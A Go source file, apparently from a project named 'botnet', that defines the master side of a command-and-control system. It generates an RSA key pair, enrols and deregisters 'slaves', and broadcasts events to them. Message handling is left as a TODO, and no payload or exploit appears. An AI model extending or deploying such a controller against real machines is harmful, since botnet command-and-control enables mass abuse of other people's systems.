package master

import (
	"crypto/rsa"
	"log"

	"github.com/adrianosela/botnet/lib/encryption"
	"github.com/adrianosela/botnet/lib/protocol"
)

// Master handles all communication between master and slaves
type Master struct {
	masterPrivKey  *rsa.PrivateKey
	masterPubKey   string
	receiveMsgChan chan *protocol.Event // Channel for receiving de-crypted messages requests
	slaves         map[string]*SlaveCtrl
}

// NewMaster is the constructor for a Master
func NewMaster() (*Master, error) {
	priv, pub, err := encryption.GenerateRSAKeyPair(8192)
	if err != nil {
		return nil, err
	}
	log.Printf("[master] public key: \n%s", string(pub))
	return &Master{
		masterPrivKey:  priv,
		masterPubKey:   string(pub),
		receiveMsgChan: make(chan *protocol.Event),
		slaves:         make(map[string]*SlaveCtrl),
	}, nil
}

// Start begins communication
func (m *Master) Start() {
	for {
		select {
		// handle the next message
		case event := <-m.receiveMsgChan:
			m.handleMessage(event)
		}
	}
}

// EnrolSlave registers a slave to the botnet
func (m *Master) EnrolSlave(slave *SlaveCtrl) {
	m.slaves[slave.id] = slave
	log.Printf("[%s] joined net", slave.id)
	go slave.writer()
	go slave.reader()
	// send ack back to slave
	slave.MsgChan <- &protocol.Event{Type: protocol.EventTypeAck}
}

// DeregisterSlave deregisters a slave from a botnet
func (m *Master) DeregisterSlave(slaveID string) {
	if slave, ok := m.slaves[slaveID]; ok {
		delete(m.slaves, slaveID)
		close(slave.MsgChan)
	}
	log.Printf("[%s] left net", slaveID)
}

func (m *Master) handleMessage(eve *protocol.Event) {
	//TODO: handle incoming messages from slaves
	log.Println("received message from slave")
	log.Println(eve)
}

func (m *Master) broadcastMessage(event *protocol.Event) {
	log.Printf("[MASTER] broadcasting message to %d slaves\n", len(m.slaves))
	for slaveID := range m.slaves {
		select {
		case m.slaves[slaveID].MsgChan <- event:
		default:
			close(m.slaves[slaveID].MsgChan)
			delete(m.slaves, slaveID)
			log.Printf("[%s] left net", slaveID)
		}
	}
}
